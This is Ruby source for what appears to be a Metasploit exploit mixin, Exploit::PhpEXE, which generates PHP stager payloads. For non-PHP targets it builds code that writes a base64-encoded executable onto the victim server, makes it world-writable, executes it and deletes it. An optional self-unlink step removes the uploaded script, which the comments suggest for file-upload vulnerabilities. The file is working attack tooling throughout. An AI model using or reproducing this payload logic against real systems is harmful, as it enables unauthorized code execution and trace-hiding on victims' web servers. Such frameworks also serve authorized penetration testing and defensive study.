# -*- coding: binary -*-

###
#
# This module exposes a simple method to create an payload in an executable.
#
###

module Msf
module Exploit::PhpEXE
  include Exploit::EXE

  require 'msf/core/payload'
  require 'msf/core/payload/php'
  include Payload::Php

  #
  # Generate a first-stage php payload.
  #
  # For ARCH_PHP targets, simply returns payload.encoded wrapped in <?php ?>
  # markers.
  #
  # For target architectures other than ARCH_PHP, this will base64 encode an
  # appropriate executable and drop it on the target system.  After running
  # it, the generated code will attempt to unlink the dropped executable which
  # will certainly fail on Windows.
  #
  # @option opts [String] :writable_path A path on the victim where we can
  #   write an executable. Uses current directory if not given.
  # @option opts [Boolean] :unlink_self Whether to call unlink(__FILE__); in
  #   the payload. Good idea for arbitrary-file-upload vulns, bad idea for
  #   write-to-a-config-file vulns
  #
  # @return [String] A PHP payload that will drop an executable for non-php
  #   target architectures
  #
  # @todo Test on Windows
  def get_write_exec_payload(opts={})
    case target_arch.first
    when ARCH_PHP
      php = payload.encoded
    else
      bin_name = Rex::Text.rand_text_alpha(8)
      if opts[:writable_path]
        bin_name = [opts[:writable_path], bin_name].join("/")
      else
        bin_name = "./#{bin_name}"
      end
      if target["Platform"] == 'win'
        bin_name << ".exe"
        print_warning("Unable to clean up #{bin_name}, delete it manually")
      end
      p = Rex::Text.encode_base64(generate_payload_exe)
      php = %Q{
      error_reporting(0);
      $ex = "#{bin_name}";
      $f = fopen($ex, "wb");
      fwrite($f, base64_decode("#{p}"));
      fclose($f);
      chmod($ex, 0777);
      function my_cmd($cmd) {
      #{php_preamble}
      #{php_system_block};
      }
      if (FALSE === strpos(strtolower(PHP_OS), 'win' )) {
        my_cmd($ex . "&");
      } else {
        my_cmd($ex);
      }
      unlink($ex);
      }
    end

    if opts[:unlink_self]
      # Prepend instead of appending to make sure it happens no matter
      # what the payload normally does.
      php = "@unlink(__FILE__);" + php
    end

    php.gsub!(/#.*$/, '')
    php.gsub!(/[\t ]+/, ' ')
    php.gsub!(/\n/, ' ')
    return "<?php #{php} ?>"
  end


end
end
